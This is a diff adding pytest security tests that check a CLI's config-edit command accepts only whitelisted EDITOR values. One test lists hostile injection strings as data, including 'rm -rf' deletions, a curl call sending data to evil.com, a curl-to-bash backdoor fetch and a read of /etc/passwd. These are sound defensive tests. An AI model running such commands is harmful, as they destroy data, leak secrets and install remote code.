@@ -321,3 +321,151 @@ class TestCLICache:
         # Command should complete but may show error for invalid action
         # This tests that the command is registered and handles bad input
         assert "invalid" in result.stdout.lower() or result.exit_code != 0
+
+
+class TestCLIConfigEditSecurity:
+    """Security tests for config edit command - CRITICAL vulnerability tests."""
+
+    def test_editor_whitelist_allows_valid_editors(
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
+        """Test that whitelisted editors are allowed."""
+        manager = ConfigManager(config_dir=tmp_path)
+
+        valid_editors = [
+            "nano", "vim", "vi", "emacs", "code", "nvim",
+            "subl", "gedit", "kate", "atom", "micro", "helix"
+        ]
+
+        for editor in valid_editors:
+            # Mock the subprocess.run to prevent actual editor launch
+            import subprocess
+            from unittest.mock import MagicMock, patch
+
+            mock_run = MagicMock()
+            with patch("subprocess.run", mock_run):
+                monkeypatch.setenv("EDITOR", editor)
+                result = runner.invoke(app, ["config", "edit"])
+
+                # Should not show unsupported editor error
+                assert "Unsupported editor" not in result.stdout
+                # Subprocess should have been called with the editor
+                assert mock_run.called
+
+    def test_editor_whitelist_blocks_invalid_editors(
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
+        """Test that non-whitelisted editors are blocked."""
+        manager = ConfigManager(config_dir=tmp_path)
+
+        invalid_editors = [
+            "bash",
+            "sh",
+            "python",
+            "perl",
+            "ruby",
+            "node",
+            "custom-editor-2023"
+        ]
+
+        for editor in invalid_editors:
+            monkeypatch.setenv("EDITOR", editor)
+            result = runner.invoke(app, ["config", "edit"])
+
+            # Should show unsupported editor error
+            assert "Unsupported editor" in result.stdout
+            assert result.exit_code == 1
+
+    def test_editor_command_injection_blocked(
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
+        """Test that command injection attempts are blocked - CRITICAL SECURITY TEST."""
+        manager = ConfigManager(config_dir=tmp_path)
+
+        # Ensure config file exists before testing
+        config = manager.load_config()
+        manager.save_config(config)
+
+        # Attack scenarios from security review
+        injection_attempts = [
+            "rm -rf ~ #",  # Delete home directory
+            "curl evil.com/steal #",  # Data exfiltration
+            "bash -c 'curl evil.com/backdoor.sh | bash' #",  # Backdoor installation
+            "echo hacked > /tmp/pwned; vim",  # Command chaining
+            "vim; rm -rf /",  # Semicolon separator
+            "vim && rm -rf ~",  # AND operator
+            "vim || rm -rf ~",  # OR operator
+            "vim | cat /etc/passwd",  # Pipe operator
+            "$(rm -rf ~)",  # Command substitution
+            "`rm -rf ~`",  # Backtick substitution
+        ]
+
+        for injection in injection_attempts:
+            monkeypatch.setenv("EDITOR", injection)
+            result = runner.invoke(app, ["config", "edit"])
+
+            # All injection attempts should be blocked
+            assert "Unsupported editor" in result.stdout
+            assert result.exit_code == 1
+            # Verify config file still exists (wasn't deleted)
+            assert manager.config_file.exists()
+
+    def test_editor_path_handling(self, tmp_path: Path, monkeypatch) -> None:
+        """Test that editor paths are correctly handled (only basename checked)."""
+        manager = ConfigManager(config_dir=tmp_path)
+
+        # Valid editor with path should work
+        import subprocess
+        from unittest.mock import MagicMock, patch
+
+        mock_run = MagicMock()
+        with patch("subprocess.run", mock_run):
+            monkeypatch.setenv("EDITOR", "/usr/bin/vim")
+            result = runner.invoke(app, ["config", "edit"])
+
+            # Should extract 'vim' from path and allow it
+            assert "Unsupported editor" not in result.stdout
+            assert mock_run.called
+
+    def test_editor_path_injection_blocked(
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
+        """Test that path-based injection attempts are blocked."""
+        manager = ConfigManager(config_dir=tmp_path)
+
+        # Malicious paths that should be blocked
+        malicious_paths = [
+            "/usr/bin/rm",
+            "/bin/bash",
+            "/usr/bin/curl",
+            "../../bin/sh",
+            "/tmp/malicious-script"
+        ]
+
+        for path in malicious_paths:
+            monkeypatch.setenv("EDITOR", path)
+            result = runner.invoke(app, ["config", "edit"])
+
+            # Should be blocked (basename not in whitelist)
+            assert "Unsupported editor" in result.stdout
+            assert result.exit_code == 1
+
+    def test_editor_default_fallback(self, tmp_path: Path, monkeypatch) -> None:
+        """Test that default editor (nano) is used when EDITOR not set."""
+        manager = ConfigManager(config_dir=tmp_path)
+
+        import subprocess
+        from unittest.mock import MagicMock, patch
+
+        # Unset EDITOR
+        monkeypatch.delenv("EDITOR", raising=False)
+
+        mock_run = MagicMock()
+        with patch("subprocess.run", mock_run):
+            result = runner.invoke(app, ["config", "edit"])
+
+            # Should use nano as default
+            assert mock_run.called
+            # First argument to subprocess.run should be list starting with 'nano'
+            call_args = mock_run.call_args[0][0]
+            assert call_args[0] == "nano"
